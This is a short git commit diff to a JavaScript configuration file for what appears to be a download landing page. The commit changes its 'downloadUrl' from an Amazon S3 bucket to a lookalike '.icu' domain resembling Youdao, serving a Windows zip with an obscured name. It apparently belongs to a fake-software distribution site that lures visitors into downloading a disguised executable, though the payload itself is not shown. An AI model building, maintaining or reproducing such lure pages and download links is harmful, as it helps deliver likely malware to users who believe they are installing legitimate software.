9d905b638115c92e9c12ff8d4783184b8c0c5c64
aa168188aaaa <lisiajlekjw@gmail.com>
2025-05-17 22:40:55 +0800

    Update xhs03bsem.js

--- static/js/xhs03bsem.js
+++ static/js/xhs03bsem.js
@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://sss33213.s3.ap-south-1.amazonaws.com/Aex_win10-11_RrdBocksxhs_8275.zip", 
+    downloadUrl: "https://youdaoselw.icu/Aex_win10-11_RrdBocksxhs_8275.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
